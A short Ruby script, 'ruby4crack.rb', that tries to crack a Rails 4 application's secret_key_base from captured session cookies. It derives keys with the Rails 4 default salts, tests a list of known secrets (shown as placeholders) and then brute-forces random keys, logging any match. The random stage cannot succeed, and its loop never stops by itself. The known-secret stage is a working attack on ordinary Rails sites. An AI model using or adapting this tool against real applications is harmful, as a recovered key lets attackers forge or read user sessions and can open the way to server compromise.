# ruby4crack.rb
# ------------------------
# The purpose of this script is to try crack a ruby4 apps secret_key_base from using cookies supplied by ruby4 apps
# It will try known secret base keys as well.
# Collecting a session cookie for each ruby app/server/enviroment will help lower the overall crackage

require 'rubygems'
require 'cgi'
require 'active_support'
require 'securerandom'


def log(message)
  File.write('/tmp/ruby4crack.log', message+"\n", mode: 'a')
end

def decrypt_session_cookie(cookies, key)
  
  # Default values for Rails 4 apps
  key_iter_num = 1000
  key_size     = 64
  salt         = "encrypted cookie"         
  signed_salt  = "signed encrypted cookie"  

  key_generator = ActiveSupport::KeyGenerator.new(key, iterations: key_iter_num)
  secret = key_generator.generate_key(salt)
  sign_secret = key_generator.generate_key(signed_salt)

  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret)
  
  
  cookies.each { |x| 
    cookie = CGI::unescape(x)
    begin
      encryptor.decrypt_and_verify(cookie)
      log('found key')
      log('cookie: '+cookie)
      log('key: '+key)
      log('')
    rescue
    end
    }
end


decoded = false

cookies = ['XXXXX%3D--XX52e712ae9cd5c0461XX8a27d3cXX9c33XX4XX8',
  ]

log('starting ruby cracker...')


known_secrets = [
  'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
  'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
  ]


known_secrets.each { |x| 
  decrypt_session_cookie(cookies, x)
}

until decoded == true
  key = SecureRandom.hex(64)
  puts 'Trying '+key
  decoded = decrypt_session_cookie(cookies, key)
end
